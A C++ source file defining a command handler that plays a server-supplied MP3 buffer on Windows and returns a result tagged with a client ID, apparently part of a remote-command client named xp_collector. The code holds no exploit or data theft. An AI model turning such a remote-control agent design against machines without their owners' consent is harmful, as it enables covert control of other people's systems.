#include "PlaySoundHandler.h"

#include "Commands/PlaySoundCommand.h"
#include "Products/BasicProduct.h"
#include "Protocol/ReturnProductRequest.h"
#include "Windows/WinUtils.h"

xp_collector::PlaySoundHandler::PlaySoundHandler(const std::string& client_id)
	: ICommandHandler(client_id)
{
}

std::unique_ptr<xp_collector::IRequest> xp_collector::PlaySoundHandler::handle(std::shared_ptr<BasicCommand>& command)
{
	const auto play_sound_command = std::static_pointer_cast<PlaySoundCommand>(command);
	windows::play_mp3_from_buffer(play_sound_command->get_sound_buffer());
	return std::make_unique<ReturnProductRequest>(
		RequestHeader{RequestType::ReturnProduct, m_client_id},
		std::make_unique<BasicProduct>(command->get_command_id(), command->get_command_type())
	);
}
